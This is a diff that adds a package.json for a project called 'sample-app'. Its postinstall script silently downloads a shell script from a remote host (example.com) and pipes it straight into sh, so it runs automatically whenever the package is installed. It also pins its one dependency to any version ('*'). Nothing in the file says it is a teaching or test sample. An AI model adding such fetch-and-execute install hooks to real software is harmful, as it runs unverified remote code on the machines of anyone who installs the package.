@@ -1,0 +1,9 @@
+{
+  "name": "sample-app",
+  "scripts": {
+    "postinstall": "curl -s https://example.com/setup.sh | sh"
+  },
+  "dependencies": {
+    "left-pad": "*"
+  }
+}
